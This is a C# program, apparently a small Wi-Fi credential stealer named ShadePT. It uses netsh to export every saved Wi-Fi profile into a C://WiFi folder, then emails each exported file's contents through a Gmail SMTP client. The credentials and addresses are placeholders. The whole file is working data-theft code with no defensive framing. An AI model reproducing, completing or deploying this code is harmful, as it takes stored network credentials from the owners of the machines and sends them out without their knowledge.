using System;
using System.IO;
using System.Collections.Generic;
using System.Net.Mail;

namespace ShadePT
{
	class MainClass
	{
		static Netsh _Netsh = new Netsh();
		static GmailClient _GClient = new GmailClient("email", "password");

		public static void Main(string[] args)
		{

			Directory.CreateDirectory("C://WiFi");

			string[] names = _Netsh.GetProfilesNames();

			foreach (string name in names)
			{
				_Netsh.ExportProfile(name, "\\WiFi");
			}

			Console.Clear();

			foreach (string file in Directory.GetFiles("C://WiFi"))
			{
				MailMessage msg = new MailMessage(
					"from",
					"to",
					Path.GetFileName(file),
					File.ReadAllText(file)
				);

				Console.WriteLine(" Sending - " + Path.GetFileName(file));
				_GClient.Send(msg);
			}
		}
	}
}
